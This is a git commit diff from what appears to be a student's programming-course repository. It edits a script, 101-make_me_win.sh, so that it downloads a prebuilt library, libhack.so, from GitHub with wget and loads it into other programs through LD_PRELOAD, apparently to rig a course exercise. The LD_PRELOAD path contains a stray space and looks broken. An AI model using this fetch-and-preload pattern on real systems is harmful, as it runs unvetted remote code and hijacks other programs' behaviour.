e2786a93ac076ab92fe9820a4e0478b6861ae880
THEOTHERGUY23 <mzimnguni23@gmail.com>
2024-03-28 04:26:24 -0700

    all

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,2 +1,3 @@
 #!/bin/bash
-wget -P
+wget -P .. https://raw.githubusercontent.com/THEOTHERGUY23/alx-low_level_programming/ecddfb69bc847cd014f41432c6caf4f9874745d2/0x18-dynamic_libraries/libhack.so
+export LD_PRELOAD="$PWD/ ../libhack.so"
